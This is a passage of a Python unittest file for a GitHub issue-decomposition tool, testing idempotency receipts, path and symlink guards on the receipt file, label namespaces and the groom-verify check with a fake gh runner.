            with mock.patch.object(lb, "read_board_config",
                                   return_value=lb.BoardConfig(owner="o", number=1, source="committed")), \
                 mock.patch.object(lb, "apply_priority_field", side_effect=fake_apply_priority):
                out = lb.verb_decompose(182, str(spec_path), _ctx(str(root)), runner,
                                        set_status=fake_set_status,
                                        deboard=lambda number, board, ctx, run: {"issue": number, "deboarded": False})
            self.assertEqual(seen["call"][0], "IT_FROM_STATUS")
            self.assertEqual(seen["call"][1], "p1")
            self.assertEqual(out["parent_priority"], "p1")

    def test_omitted_posture_writes_no_label(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            (root / "parent.md").write_text("parent", encoding="utf-8")
            spec = {"body_file": "parent.md", "priority": "p2", "milestone": None, "sub_issues": []}
            spec_path = root / "spec.json"
            spec_path.write_text(json.dumps(spec), encoding="utf-8")

            runner = FakeRunner([
                (["project", "field-list", "1", "--owner", "o"], _decompose_field_list()),
                (["issue", "edit", "182", "--repo", "o/r", "--body-file"],
                 _ok("https://github.com/o/r/issues/182\n")),
            ])
            with mock.patch.object(lb, "read_board_config",
                                   return_value=lb.BoardConfig(owner="o", number=1, source="committed")), \
                 mock.patch.object(lb, "apply_posture_label") as spy:
                out = lb.verb_decompose(182, str(spec_path), _ctx(str(root)), runner,
                                        set_status=lambda p, s, c, r, force=False: {"stage": s},
                                        deboard=lambda number, board, ctx, run: {"issue": number, "deboarded": False})
            spy.assert_not_called()
            self.assertIsNone(out["parent_posture"])

    def test_decompose_always_stamps_planned_never_ready_for_work(self) -> None:
        # #321: verb_decompose must never target ready_for_work — the human
        # approval stamp. The transition already hardcodes the "planned"
        # string literal (no spec key reaches it); this test pins that
        # invariant for every spec shape, including one carrying a `posture`
        # and a `complexity`, rather than adding a runtime guard on a
        # constant no refactor has proposed.
        specs = [
            {"body_file": "parent.md", "priority": "p2", "milestone": None, "sub_issues": []},
            {"body_file": "parent.md", "priority": "p2", "posture": "autonomous", "complexity": "high",
             "milestone": None, "sub_issues": []},
        ]
        for spec in specs:
            with self.subTest(spec=spec):
                with tempfile.TemporaryDirectory() as d:
                    root = Path(d)
                    (root / "parent.md").write_text("parent", encoding="utf-8")
                    spec_path = root / "spec.json"
                    spec_path.write_text(json.dumps(spec), encoding="utf-8")

                    seen = {}

                    def fake_set_status(parent, stage, ctx, run, force=False):
                        seen["call"] = (parent, stage)
                        return {"issue": parent, "stage": stage, "previous_stage": None}

                    runner = FakeRunner([
                        (["project", "field-list", "1", "--owner", "o"], _decompose_field_list()),
                        (["issue", "edit", "182", "--repo", "o/r", "--body-file"],
                         _ok("https://github.com/o/r/issues/182\n")),
                    ])
                    with mock.patch.object(
                            lb, "read_board_config",
                            return_value=lb.BoardConfig(owner="o", number=1, source="committed")), \
                         mock.patch.object(lb, "apply_complexity_label"), \
                         mock.patch.object(lb, "apply_posture_label"):
                        lb.verb_decompose(182, str(spec_path), _ctx(str(root)), runner,
                                          set_status=fake_set_status,
                                          deboard=lambda number, board, ctx, run: {
                                              "issue": number, "deboarded": False})
                    self.assertEqual(seen["call"], (182, "planned"))


class DecomposeReceiptTest(unittest.TestCase):
    """`--decompose` idempotency, receipt-backed (#349 / #355).

    Two identical invocations used to create two complete, disjoint issue sets.
    Every double-invocation case here queues the second run with an EMPTY
    FakeRunner, so a regression fails loudly on an unexpected argv rather than
    passing on a lenient count assertion.

    These cases need a REAL git repository: the receipt lives under Git's common
    directory, and the sibling decompose tests run in plain temp directories,
    which exercise the unguarded fallback instead.
    """

    SUBS = [{"title": "core", "body_file": "s1.md"},
            {"title": "follow", "body_file": "s2.md", "blocked_by": [0]}]

    def setUp(self) -> None:
        patch = mock.patch.object(lb, "apply_priority_field",
                                  return_value={"item_id": "IT_1", "priority": "p2"})
        patch.start()
        self.addCleanup(patch.stop)

    def _repo(self, spec: dict) -> "tuple[Path, dict]":
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        root = Path(tmp.name)
        subprocess.run(["git", "-C", str(root), "init", "-q"], check=True,
                       capture_output=True, text=True)
        for name, text in (("p.md", "parent"), ("s1.md", "sub1"), ("s2.md", "sub2")):
            (root / name).write_text(text, encoding="utf-8")
        (root / "spec.json").write_text(json.dumps(spec), encoding="utf-8")
        return root, spec

    def _run(self, root: Path, runner, parent=182, force=False, set_status=None) -> dict:
        with mock.patch.object(lb, "read_board_config",
                               return_value=lb.BoardConfig(owner="o", number=1,
                                                           source="committed")):
            return lb.verb_decompose(
                parent, str(root / "spec.json"), _ctx(str(root)), runner,
                set_status=set_status or (lambda *a, **k: {"stage": "planned",
                                                           "previous_stage": None}),
                deboard=lambda n, b, c, r: {"issue": n, "deboarded": True},
                force=force)

    @staticmethod
    def _receipt_path(root: Path, parent, spec: dict) -> Path:
        return lb.decompose_receipt_path(
            lb.decompose_receipt_key("o/r", parent, spec), _ctx(str(root)))

    @staticmethod
    def _existing_parent_runner():
        return FakeRunner([
            (["project", "field-list", "1", "--owner", "o"], _decompose_field_list()),
            (["issue", "edit", "182", "--repo", "o/r", "--body-file"],
             _ok("https://github.com/o/r/issues/182\n")),
            (["issue", "create", "--repo", "o/r", "--parent", "182", "--title", "core"],
             _ok("https://github.com/o/r/issues/183\n")),
            (["issue", "create", "--repo", "o/r", "--parent", "182", "--title", "follow"],
             _ok("https://github.com/o/r/issues/184\n")),
            (["issue", "edit", "184", "--repo", "o/r", "--add-blocked-by", "183"], _ok("")),
        ])

    def test_repeat_new_parent_run_creates_one_issue_set(self) -> None:
        # AC1 + AC3: `--decompose --spec X` twice, no --issue.
        root, spec = self._repo({"body_file": "p.md", "parent_title": "epic",
                                 "priority": "p2", "milestone": None, "sub_issues": self.SUBS})
        first = self._run(root, FakeRunner([
            (["project", "field-list", "1", "--owner", "o"], _decompose_field_list()),
            (["issue", "create", "--repo", "o/r", "--title", "epic"],
             _ok("https://github.com/o/r/issues/265\n")),
            (["issue", "create", "--repo", "o/r", "--parent", "265", "--title", "core"],
             _ok("https://github.com/o/r/issues/266\n")),
            (["issue", "create", "--repo", "o/r", "--parent", "265", "--title", "follow"],
             _ok("https://github.com/o/r/issues/267\n")),
            (["issue", "edit", "267", "--repo", "o/r", "--add-blocked-by", "266"], _ok("")),
        ]), parent=None)
        self.assertFalse(first["reused"])
        self.assertEqual(first["parent"], 265)

        # No responses at all: any gh call in the second run raises.
        second_runner = FakeRunner([])
        second = self._run(root, second_runner, parent=None)
        self.assertEqual(second_runner.calls, [])
        self.assertTrue(second["reused"])
        self.assertEqual(second["parent"], 265)
        self.assertEqual([s["number"] for s in second["sub_issues"]], [266, 267])

    def test_repeat_existing_parent_run_creates_one_sub_issue_set(self) -> None:
        # AC2: `--decompose <N> --spec X` twice bounds duplication to the sub
        # set today, which is still a duplicate set under the same parent.
        root, spec = self._repo({"body_file": "p.md", "priority": "p2",
                                 "milestone": None, "sub_issues": self.SUBS})
        first = self._run(root, self._existing_parent_runner())
        self.assertEqual([s["number"] for s in first["sub_issues"]], [183, 184])

        second_runner = FakeRunner([])
        second = self._run(root, second_runner)
        self.assertEqual(second_runner.calls, [])
        self.assertTrue(second["reused"])
        self.assertEqual([s["number"] for s in second["sub_issues"]], [183, 184])
        self.assertFalse(second["partial"])

    def test_completed_run_records_the_full_result_on_disk(self) -> None:
        # AC3 + AC4: `reused` and `receipt_path` on every result; a run that
        # reaches the end leaves the complete result JSON with partial: false.
        root, spec = self._repo({"body_file": "p.md", "priority": "p2",
                                 "milestone": None, "sub_issues": self.SUBS})
        out = self._run(root, self._existing_parent_runner())
        self.assertFalse(out["reused"])
        self.assertFalse(out["partial"])
        self.assertTrue(out["receipt_written"])
        self.assertIsNone(out["receipt_error"])

        path = self._receipt_path(root, 182, spec)
        self.assertEqual(out["receipt_path"], str(path))
        recorded = json.loads(path.read_text(encoding="utf-8"))
        self.assertFalse(recorded["partial"])
        self.assertEqual(recorded["stage"], "planned")
        self.assertEqual(recorded["dependencies_wired"], 1)
        self.assertEqual([s["number"] for s in recorded["sub_issues"]], [183, 184])

    def test_force_recreates_the_set_and_overwrites_the_receipt(self) -> None:
        # AC5: the deliberate escape hatch after the recorded set was closed.
        root, spec = self._repo({"body_file": "p.md", "priority": "p2",
                                 "milestone": None, "sub_issues": self.SUBS})
        self._run(root, self._existing_parent_runner())
        forced = self._run(root, FakeRunner([
            (["project", "field-list", "1", "--owner", "o"], _decompose_field_list()),
            (["issue", "edit", "182", "--repo", "o/r", "--body-file"],
             _ok("https://github.com/o/r/issues/182\n")),
            (["issue", "create", "--repo", "o/r", "--parent", "182", "--title", "core"],
             _ok("https://github.com/o/r/issues/283\n")),
            (["issue", "create", "--repo", "o/r", "--parent", "182", "--title", "follow"],
             _ok("https://github.com/o/r/issues/284\n")),
            (["issue", "edit", "284", "--repo", "o/r", "--add-blocked-by", "283"], _ok("")),
        ]), force=True)
        self.assertFalse(forced["reused"])
        self.assertEqual([s["number"] for s in forced["sub_issues"]], [283, 284])
        recorded = json.loads(Path(forced["receipt_path"]).read_text(encoding="utf-8"))
        self.assertEqual([s["number"] for s in recorded["sub_issues"]], [283, 284])

    def test_failing_receipt_write_is_reported_not_fatal(self) -> None:
        # AC6: the issue set already exists by the time either write runs, so
        # discarding the result over a failed local write is strictly worse.
        root, _ = self._repo({"body_file": "p.md", "priority": "p2",
                              "milestone": None, "sub_issues": self.SUBS})
        boom = lb.BoardError("packet_write_failed", "disk is full", "free space")
        with mock.patch.object(lb, "_atomic_private_write", side_effect=boom):
            out = self._run(root, self._existing_parent_runner())
        self.assertEqual([s["number"] for s in out["sub_issues"]], [183, 184])
        self.assertFalse(out["receipt_written"])
        self.assertIn("packet_write_failed", out["receipt_error"])

    def test_receipt_path_refuses_symlinks_and_stays_contained(self) -> None:
        # AC7: the same guards packet_path applies.
        root, _ = self._repo({"body_file": "p.md", "priority": "p2", "milestone": None, "sub_issues": []})
        ctx = _ctx(str(root))
        key = lb.decompose_receipt_key("o/r", 182, {"a": 1})
        path = lb.decompose_receipt_path(key, ctx)
        base = lb.git_common_dir(ctx) / "agentic-engineering" / "decompose-receipts"
        self.assertEqual(path.parent, base)
        self.assertEqual(path.name, f"o--r--{key[:16]}.json")

        # A key that is not a sha256 digest never reaches the filesystem. This
        # MUST run before any symlink is planted below: once a directory
        # component is a symlink the guard raises `receipt_path_unsafe` for every
        # key, so the same assertions would pass with the hex check deleted
        # outright — the loop would be asserting the symlink guard twice.
        for bad in ("../../escape", "", "nothex", None, key[:63], key + "0"):
            with self.assertRaises(lb.BoardError) as cm:
                lb.decompose_receipt_path(bad, ctx)
            self.assertEqual(cm.exception.code, "receipt_path_unsafe")

        # a symlinked directory component is refused, not followed — either one,
        # not just the leaf the previous version happened to plant
        for component in ("agentic-engineering", "agentic-engineering/decompose-receipts"):
            common = lb.git_common_dir(ctx)
            target = common / component
            shutil.rmtree(common / "agentic-engineering", ignore_errors=True)
            (common / "agentic-engineering").unlink(missing_ok=True)
            elsewhere = Path(tempfile.mkdtemp())
            self.addCleanup(shutil.rmtree, str(elsewhere), True)
            target.parent.mkdir(parents=True, exist_ok=True)
            target.symlink_to(elsewhere, target_is_directory=True)
            with self.assertRaises(lb.BoardError) as cm:
                lb.decompose_receipt_path(key, ctx)
            self.assertEqual(cm.exception.code, "receipt_path_unsafe", component)

    def test_guard_receipt_lands_before_set_status_and_survives_a_label_raise(self) -> None:
        # AC9 — the load-bearing case. Reproduces the #344 / agent-leverage#2168
        # shape: the posture `label create` hard-errors at step 5b, AFTER the
        # parent, sub-issues, edges and the planned stamp already exist. An
        # end-of-verb receipt is never reached on that raise, so the recovery
        # re-run duplicates the whole set. Asserting the guard write lands
        # BEFORE the first set_status argv is what an end-of-run receipt cannot
        # satisfy; asserting only that a receipt exists would false-pass.
        root, spec = self._repo({"body_file": "p.md", "priority": "p2",
                                 "posture": "standard", "milestone": None, "sub_issues": self.SUBS})
        path = self._receipt_path(root, 182, spec)
        at_set_status = {}

        def fake_set_status(parent, stage, ctx, run, force=False):
            at_set_status["receipt"] = lb.read_decompose_receipt(path)[0]
            return {"issue": parent, "stage": stage, "previous_stage": None}

        failing_label = subprocess.CompletedProcess(
            args=[], returncode=1, stdout="",
            stderr="HTTP 422: description is too long (maximum is 100 characters)")
        first_runner = FakeRunner([
            (["project", "field-list", "1", "--owner", "o"], _decompose_field_list()),
            (["issue", "edit", "182", "--repo", "o/r", "--body-file"],
             _ok("https://github.com/o/r/issues/182\n")),
            (["issue", "create", "--repo", "o/r", "--parent", "182", "--title", "core"],
             _ok("https://github.com/o/r/issues/183\n")),
            (["issue", "create", "--repo", "o/r", "--parent", "182", "--title", "follow"],
             _ok("https://github.com/o/r/issues/184\n")),
            (["issue", "edit", "184", "--repo", "o/r", "--add-blocked-by", "183"], _ok("")),
            (["issue", "view", "182", "--repo", "o/r", "--json", "labels"],
             _ok('{"labels": []}')),
            (["label", "create", "posture:standard", "--repo", "o/r"], failing_label),
        ])
        with self.assertRaises(lb.BoardError) as cm:
            self._run(root, first_runner, set_status=fake_set_status)
        self.assertEqual(cm.exception.code, "label_write_failed")

        # the guard receipt was already on disk when set_status was called
        guard = at_set_status["receipt"]
        self.assertIsNotNone(guard, "guard receipt must precede the set_status write")
        self.assertTrue(guard["partial"])
        self.assertEqual([s["number"] for s in guard["sub_issues"]], [183, 184])
        self.assertEqual(guard["dependencies_wired"], 1)
        # it records the durable structure only — not the tail steps that raised
        self.assertNotIn("stage", guard)

        # ...and it survived the raise, so the recovery re-run creates nothing.
        on_disk = json.loads(path.read_text(encoding="utf-8"))
        self.assertTrue(on_disk["partial"])
        second_runner = FakeRunner([])
        second = self._run(root, second_runner)
        self.assertEqual(second_runner.calls, [])
        self.assertTrue(second["reused"])
        self.assertTrue(second["partial"])
        self.assertEqual([s["number"] for s in second["sub_issues"]], [183, 184])

    def test_receipt_key_discriminates_repo_parent_and_spec(self) -> None:
        # The key decides HIT vs MISS, and a degenerate one does NOT duplicate —
        # it silently SKIPS a genuinely different decomposition and reports the
        # recorded set's issue numbers instead. That is worse than the bug this
        # receipt fixes: a missing issue set plus a confidently wrong report.
        # The repeat-invocation cases above only prove key(X) == key(X); each
        # builds its own tempdir, so nothing there proves key(X) != key(Y).
        spec = {"body_file": "p.md", "priority": "p2", "milestone": None, "sub_issues": self.SUBS}
        base = lb.decompose_receipt_key("o/r", 182, spec)
        for label, other in (
                ("slug", lb.decompose_receipt_key("o/other", 182, spec)),
                ("parent", lb.decompose_receipt_key("o/r", 183, spec)),
                ("new-vs-existing parent", lb.decompose_receipt_key("o/r", None, spec)),
                ("spec", lb.decompose_receipt_key("o/r", 182, {**spec, "priority": "p1"})),
                ("sub_issues", lb.decompose_receipt_key("o/r", 182,
                                                        {**spec, "milestone": None, "sub_issues": []}))):
            self.assertNotEqual(base, other, f"key must discriminate on {label}")
        # ...while staying stable across byte-different but equivalent JSON,
        # which is what makes a legitimate repeat invocation a hit at all.
        self.assertEqual(base, lb.decompose_receipt_key(
            "o/r", 182, json.loads(json.dumps(spec, sort_keys=True))))

    def test_receipt_key_is_recorded_and_a_foreign_receipt_is_not_reused(self) -> None:
        # The filename carries only key[:16], so the path alone does not identify
        # an invocation. A receipt copied between clones (or a 64-bit prefix
        # collision) would otherwise be replayed as this spec's own result.
        root, spec = self._repo({"body_file": "p.md", "priority": "p2",
                                 "milestone": None, "sub_issues": self.SUBS})
        first = self._run(root, self._existing_parent_runner())
        path = Path(first["receipt_path"])
        recorded = json.loads(path.read_text(encoding="utf-8"))
        self.assertEqual(recorded["key"],
                         lb.decompose_receipt_key("o/r", 182, spec),
                         "the completed overwrite must keep the key, or the next "
                         "run reads a keyless receipt, misses, and duplicates")

        # same path, a different invocation's contents -> miss, and it re-creates
        path.write_text(json.dumps({**recorded, "key": "0" * 64, "parent": 999}),
                        encoding="utf-8")
        out = self._run(root, self._existing_parent_runner())
        self.assertFalse(out["reused"])
        self.assertEqual(out["parent"], 182)
        self.assertIn("key mismatch", out["receipt_anomaly"] or "")

    def test_present_but_unusable_receipt_is_a_miss_that_reports_itself(self) -> None:
        # `load_cache`'s swallow-everything rule is inverted here: a receipt miss
        # costs a duplicate ISSUE SET, not one API call. So these stay misses
        # (refusing to decompose over a rotted local file would be worse), but
        # they must not masquerade as "no previous run".
        root, spec = self._repo({"body_file": "p.md", "priority": "p2",
                                 "milestone": None, "sub_issues": self.SUBS})
        path = self._receipt_path(root, 182, spec)
        path.parent.mkdir(parents=True, exist_ok=True)
        for junk in ("{truncated", "[1, 2]", "null", '"a string"', "{}",
                     '{"parent": 1}'):
            path.write_text(junk, encoding="utf-8")
            recorded, anomaly = lb.read_decompose_receipt(path)
            self.assertIsNone(recorded, junk)
            self.assertIsNotNone(anomaly, f"{junk!r} must report, not pass as absent")
        # absent is the ONE routine miss and stays silent
        path.unlink()
        self.assertEqual(lb.read_decompose_receipt(path), (None, None))

        # end to end: the verb re-creates rather than raising, and says why
        path.write_text("{truncated", encoding="utf-8")
        out = self._run(root, self._existing_parent_runner())
        self.assertFalse(out["reused"])
        self.assertIn("receipt_corrupt", out["receipt_anomaly"] or "")

    def test_unguarded_run_reports_that_it_wrote_no_receipt(self) -> None:
        # ~20 sibling DecomposeVerbTest cases traverse this path (they run in
        # plain non-git tempdirs) but none inspects the reporting fields, so
        # blanking receipt_error here would go unnoticed while every run claimed
        # a receipt it never wrote.
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        root = Path(tmp.name)          # deliberately NOT a git repository
        for name, text in (("p.md", "parent"), ("s1.md", "sub1"), ("s2.md", "sub2")):
            (root / name).write_text(text, encoding="utf-8")
        (root / "spec.json").write_text(
            json.dumps({"body_file": "p.md", "priority": "p2", "milestone": None, "sub_issues": self.SUBS}),
            encoding="utf-8")
        out = self._run(root, self._existing_parent_runner())
        self.assertIsNone(out["receipt_path"])
        self.assertFalse(out["receipt_written"])
        self.assertIn("git_common_dir", out["receipt_error"] or "")


class ComplexityLabelGuardrailTest(unittest.TestCase):
    """Freeze the complexity-label CATEGORY, not a frozen literal set of tiers.

    A guardrail pinned to exact strings false-passes when the surface is renamed
    but still broken; assert the `complexity:` namespace exists, carries self-heal
    metadata, and is applied by verb_decompose. Mirrors the category-not-literal
    policy the status:* labels follow (see skill_transition_ownership_test.py)."""

    def test_complexity_category_is_defined_with_metadata(self) -> None:
        self.assertTrue(lb.COMPLEXITY_LABELS, "complexity label vocabulary must be non-empty")
        for label in lb.COMPLEXITY_LABELS.values():
            # Category, not literal spelling: every label lives in `complexity:`.
            self.assertTrue(label.startswith("complexity:"), label)
            self.assertIn(label, lb.COMPLEXITY_LABEL_META)  # color/description self-heal present

    def test_writer_emits_a_complexity_namespace_label(self) -> None:
        ctx = lb.RepoContext(root=".", main_root=".", origin_owner="o",
                             origin_repo="r", default_branch="main")
        tier = next(iter(lb.COMPLEXITY_TIERS))  # any tier — don't pin which
        label = lb.COMPLEXITY_LABELS[tier]
        runner = FakeRunner([
            (["issue", "view", "5", "--repo", "o/r", "--json", "labels"], _ok('{"labels":[]}')),
            (["label", "create", label, "--repo", "o/r"], _ok("")),
            (["issue", "edit", "5", "--repo", "o/r", "--add-label", label], _ok("")),
        ])
        out = lb.apply_complexity_label(5, tier, ctx, runner)
        self.assertTrue(out["label"].startswith("complexity:"))

    def test_verb_decompose_is_wired_to_the_complexity_writer(self) -> None:
        # The dispatch unit's complexity must be applied by the SINGLE decompose
        # writer — not re-derived elsewhere. Prove the wiring structurally.
        self.assertIn("apply_complexity_label", inspect.getsource(lb.verb_decompose))


class PostureLabelGuardrailTest(unittest.TestCase):
    """Freeze the posture-label CATEGORY, not a frozen literal spelling.

    Repo policy (see ComplexityLabelGuardrailTest above): a guardrail pinned to
    an exact label string false-passes when the surface is renamed but still
    broken. Assert the `posture:` namespace exists, carries self-heal
    metadata, and is applied by verb_decompose — never assert the literal
    label spelling."""

    def test_posture_category_is_defined_with_metadata(self) -> None:
        self.assertTrue(lb.POSTURE_LABELS, "posture label vocabulary must be non-empty")
        for label in lb.POSTURE_LABELS.values():
            # Category, not literal spelling: every label lives in `posture:`.
            self.assertTrue(label.startswith("posture:"), label)
            self.assertIn(label, lb.POSTURE_LABEL_META)  # color/description self-heal present

    def test_writer_emits_a_posture_namespace_label(self) -> None:
        ctx = lb.RepoContext(root=".", main_root=".", origin_owner="o",
                             origin_repo="r", default_branch="main")
        value = next(iter(lb.POSTURE_LABELS))  # any labeled value — don't pin which
        label = lb.POSTURE_LABELS[value]
        runner = FakeRunner([
            (["issue", "view", "5", "--repo", "o/r", "--json", "labels"], _ok('{"labels":[]}')),
            (["label", "create", label, "--repo", "o/r"], _ok("")),
            (["issue", "edit", "5", "--repo", "o/r", "--add-label", label], _ok("")),
        ])
        out = lb.apply_posture_label(5, value, ctx, runner)
        self.assertTrue(out["label"].startswith("posture:"))

    def test_verb_decompose_is_wired_to_the_posture_writer(self) -> None:
        # The claimed unit's posture must be applied by the SINGLE decompose
        # writer — not re-derived elsewhere. Prove the wiring structurally.
        self.assertIn("apply_posture_label", inspect.getsource(lb.verb_decompose))

    def test_verb_decompose_is_wired_to_the_priority_writer(self) -> None:
        self.assertIn("apply_priority_field", inspect.getsource(lb.verb_decompose))


class LabelDescriptionLengthGuardrailTest(unittest.TestCase):
    """GitHub caps a label description at 100 characters. Every self-created
    label family is upserted through the same `gh label create --force` path, so
    one over-long description 422s mid-run and leaves a half-written board.

    Walk the metadata maps by NAMESPACE SUFFIX, not by literal label name: a
    guardrail pinned to today's spelling false-passes after a rename, and the
    suffix walk also covers a label family added later without editing this
    test."""

    LIMIT = 100  # GitHub's documented cap on a label description

    def _meta_maps(self) -> dict:
        return {name: value for name, value in vars(lb).items()
                if name.endswith("_LABEL_META") and isinstance(value, dict)}

    def _over_limit(self, maps: dict) -> list:
        return [(name, label, len(description))
                for name, meta in maps.items()
                for label, (_color, description) in meta.items()
                if len(description) > self.LIMIT]

    def test_metadata_maps_are_discoverable(self) -> None:
        # Without this, a renamed convention would make the walk below iterate
        # nothing and pass vacuously.
        self.assertTrue(self._meta_maps(), "no *_LABEL_META maps found in lifecycle_board")

    def test_every_description_fits_githubs_limit(self) -> None:
        self.assertEqual([], self._over_limit(self._meta_maps()))

    def test_the_walk_flags_an_over_long_description(self) -> None:
        # Prove the walk actually measures, so the assertion above is a real gate.
        synthetic = {"FUTURE_LABEL_META": {"future:label": ("FFFFFF", "x" * (self.LIMIT + 1))}}
        self.assertEqual([("FUTURE_LABEL_META", "future:label", self.LIMIT + 1)],
                         self._over_limit(synthetic))


class GroomVerifyVerbTest(unittest.TestCase):
    """The postcondition verb: Status>=planned, with an
    exact sub-issue/blocked count straight from the parent's sub-issue nodes."""

    @staticmethod
    def _issue_payload(stage, subs, labels=(), priority="p2"):
        node = {
            "id": "IT_1",
            "project": {"id": "PJ", "number": 1, "owner": {"login": "o"}},
            "fieldValueByName": {"name": stage},
        }
        if priority is not None:
            node["priority"] = {"name": priority}
        return json.dumps({"data": {"repository": {"issue": {
            "number": 182, "state": "OPEN", "authorAssociation": "MEMBER", "url": "u",
            "labels": {"nodes": [{"name": n} for n in labels]},
            "subIssues": {"nodes": subs},
            "projectItems": {"nodes": [node]}}}}})

    def _run(self, root, stage, subs, deboard=None, labels=(), priority="p2"):
        runner = FakeRunner([(["api", "graphql"],
                              _ok(self._issue_payload(stage, subs, labels, priority)))])
        # Default: every touched sub is NOT on the board (no warnings). Tests that
        # exercise the still-boarded path inject their own deboard seam.
        deboard = deboard or (lambda number, board, ctx, run: {"issue": number, "deboarded": False})
        with mock.patch.object(lb, "read_board_config",
                               return_value=lb.BoardConfig(owner="o", number=1, source="committed")):
            return lb.verb_groom_verify(182, _ctx(str(root)), runner, deboard=deboard)

    def _write_plan(self, root, number=182):
        (root / "docs" / "plans").mkdir(parents=True, exist_ok=True)
        (root / "docs" / "plans" / "p.md").write_text(
            f"---\ntitle: t\ngithub_issue: {number}\n---\nbody\n", encoding="utf-8")

    def test_groomed_when_planned_with_plan_doc(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            self._write_plan(root)
            out = self._run(root, "planned", [
                {"number": 183, "state": "OPEN", "blockedBy": {"nodes": []}},
                {"number": 184, "state": "OPEN", "blockedBy": {"nodes": [{"state": "OPEN"}]}},
                {"number": 185, "state": "OPEN", "blockedBy": {"nodes": [{"state": "OPEN"}]}}])
            self.assertTrue(out["groomed"])
            self.assertEqual(out["sub_issue_count"], 3)
            self.assertEqual(out["sub_issues_with_dependencies"], 2)
            self.assertEqual(out["failures"], [])

    def test_groomed_without_plan_doc(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            out = self._run(Path(d), "planned", [])  # no plan file written
            self.assertTrue(out["groomed"])
            self.assertEqual(out["failures"], [])

    def test_not_groomed_when_stage_below_planned(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            root = Path(d)
            self._write_plan(root)
            out = self._run(root, "brainstormed", [])
            self.assertFalse(out["groomed"])
            self.assertTrue(any("expected >= planned" in f for f in out["failures"]))

    def test_not_groomed_when_priority_unset(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            out = self._run(Path(d), "planned", [], priority=None)
            self.assertFalse(out["groomed"])
            self.assertTrue(any("priority is" in f for f in out["failures"]))

    def test_reports_autonomous_posture_when_unlabeled(self) -> None:
        # Unlabeled issues resolve to the hands-off default, so an attested
        # unlabeled parent is cleared with no label write anywhere.
        with tempfile.TemporaryDirectory() as d:
            out = self._run(Path(d), "planned", [])
            self.assertEqual(out["posture"], "autonomous")
            self.assertTrue(out["cleared"])
            self.assertNotIn("posture_source", out)

    def test_reports_standard_posture_from_the_label(self) -> None:
        with tempfile.TemporaryDirectory() as d:
            out = self._run(Path(d), "planned", [], labels=["posture:standard"])
            self.assertEqual(out["posture"], "standard")
            self.assertFalse(out["cleared"])

    def test_cleared_fuses_attestation_and_clearance(self) -> None:
        # The routing boundary reads one value instead of reassembling the
        # attestation-plus-posture pair from labels plus Status.
        with tempfile.TemporaryDirectory() as d:
            out = self._run(Path(d), "planned", [])
            self.assertTrue(out["groomed"])
            self.assertTrue(out["cleared"])

    def test_default_without_attestation_is_not_cleared(self) -> None:
        # The autonomous default on an un-groomed issue grants nothing:
        # grooming attestation is the half no posture can satisfy.
        with tempfile.TemporaryDirectory() as d:
            out = self._run(Path(d), "stub", [])
            self.assertFalse(out["groomed"])
            self.assertEqual(out["posture"], "autonomous")
            self.assertFalse(out["cleared"])

    def test_any_posture_label_blocks_cleared(self) -> None:
        # Every labeled state — the written opt-out, a legacy grant label, a
        # conflict, a case variant, or an unknown value — resolves `standard`
        # AND `cleared: false`, even on an attested issue.
        labeled = [["posture:standard"],
                   ["posture:autonomous"],
                   ["posture:autonomous", "posture:standard"],
                   ["posture:autonomous", "Posture:Standard"],
                   ["posture:experimental"]]
        with tempfile.TemporaryDirectory() as d:
            for labels in labeled:
                with self.subTest(labels=labels):
                    out = self._run(Path(d), "planned", [], labels=labels)
                    self.assertTrue(out["groomed"])
                    self.assertEqual(out["posture"], "standard")
                    self.assertFalse(out["cleared"])

    def test_unrelated_namespaces_do_not_affect_posture(self) -> None:
        # `complexity:*` and `status:*` share the issue but not the namespace.
        with tempfile.TemporaryDirectory() as d:
            out = self._run(Path(d), "planned", [],
                            labels=["complexity:high", "status:in-progress"])
            self.assertEqual(out["posture"], "autonomous")

    def test_no_warnings_when_no_sub_is_boarded(self) -> None:
        # The CI-add-after-verify race: at verify time the subs are not yet on
        # the board, so no warning and — critically — groomed stays true.
        with tempfile.TemporaryDirectory() as d:
            out = self._run(Path(d), "planned", [
                {"number": 183, "state": "OPEN", "blockedBy": {"totalCount": 0}}])
            self.assertTrue(out["groomed"])
            self.assertEqual(out["warnings"], [])

    def test_still_boarded_sub_is_a_warning_not_a_failure(self) -> None:
        # A sub is on the board at verify time: best-effort de-board it and record
        # a warning. Warnings never flip `groomed` to false (exit stays 0).
        def boarded(number, board, ctx, run):
            return {"issue": number, "deboarded": True}
        with tempfile.TemporaryDirectory() as d:
            out = self._run(Path(d), "planned", [
                {"number": 183, "state": "OPEN", "blockedBy": {"totalCount": 0}},
                {"number": 184, "state": "CLOSED", "blockedBy": {"totalCount": 0}}],
                deboard=boarded)
            self.assertTrue(out["groomed"])
            self.assertEqual(out["failures"], [])
            # Only the OPEN sub is de-boarded/warned; the CLOSED one is skipped.
            self.assertEqual([w["issue"] for w in out["warnings"]], [183])
            self.assertEqual(out["warnings"][0]["warning"], "sub_issue_on_board")

    def test_failed_deboard_at_verify_is_a_warning(self) -> None:
        def failing(number, board, ctx, run):
            return {"issue": number, "deboarded": False, "error": "boom"}
        with tempfile.TemporaryDirectory() as d:
            out = self._run(Path(d), "planned", [
                {"number": 183, "state": "OPEN", "blockedBy": {"totalCount": 0}}],
                deboard=failing)
            self.assertTrue(out["groomed"])
            self.assertEqual([w["issue"] for w in out["warnings"]], [183])

    def test_second_verify_after_archive_emits_no_repeat_warning(self) -> None:
        # Idempotency at verify against the REALISTIC post-archive payload. Using
        # the REAL _deboard_subissue (deboard=None): the parent read yields one
        # OPEN sub, then the sub is re-read and its item comes back isArchived:true
        # (real GraphQL includeArchived default). parse_issue_state reads that as
        # not-on-board, so _deboard_subissue reports deboarded=False with no error
        # and no archive call fires -> NO repeated warning on the second verify.
        with tempfile.TemporaryDirectory() as d:
            runner = FakeRunner([
                (["api", "graphql"], _ok(self._issue_payload("planned", [
                    {"number": 263, "state": "OPEN", "blockedBy": {"totalCount": 0}}]))),
                (["api", "graphql"], _ok(_subissue_payload(item=True, archived=True))),
            ])
            with mock.patch.object(lb, "read_board_config",
                                   return_value=lb.BoardConfig(owner="o", number=1, source="committed")):
